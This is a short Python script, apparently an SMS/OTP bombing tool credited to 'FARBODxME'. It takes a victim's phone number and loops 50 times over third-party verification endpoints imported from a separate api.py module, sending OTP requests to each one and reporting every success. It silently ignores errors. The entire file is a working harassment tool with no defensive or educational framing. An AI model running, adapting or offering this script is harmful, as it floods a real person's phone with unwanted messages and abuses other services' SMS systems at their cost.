from api import send_otp_requests
import requests #pip install requests
from colorama import Fore,init #pip install colorama

init()

# Receive phone number input from the user
try:

    number = input(Fore.RED+"********************************************* \n"+ '\n' + Fore.WHITE+"By"+ ' ' + Fore.RED +"FARBODxME \n" + '\n' + Fore.WHITE+"Update :" + ' ' + Fore.YELLOW +"2024/1/6" + '\n \n' + Fore.GREEN + "Enter A Phone Number (9**********): ")

    # Get APIs from api.py
    apis = send_otp_requests(number)

    # Loop to send OTPs 50 times
    for _ in range(50):
        for url, payload, url2, payload2 in apis:
            try:
                response2 = requests.post(url2, json=payload2)
                response = requests.post(url, data=payload)
                
                if response.status_code == 200:
                    print( Fore.RED + number + ' ' + Fore.GREEN + "successfully" + ' ' + Fore.LIGHTBLACK_EX + '('+ url +')' +  '.' )
                if response2.status_code == 200:
                    print( Fore.RED + number + ' ' + Fore.GREEN + "successfully" + ' ' + Fore.LIGHTBLACK_EX + '('+ url2 +')' +  '.' )
                
            except requests.exceptions.RequestException:
                pass

except KeyboardInterrupt:
    print("\nGoodbye!")
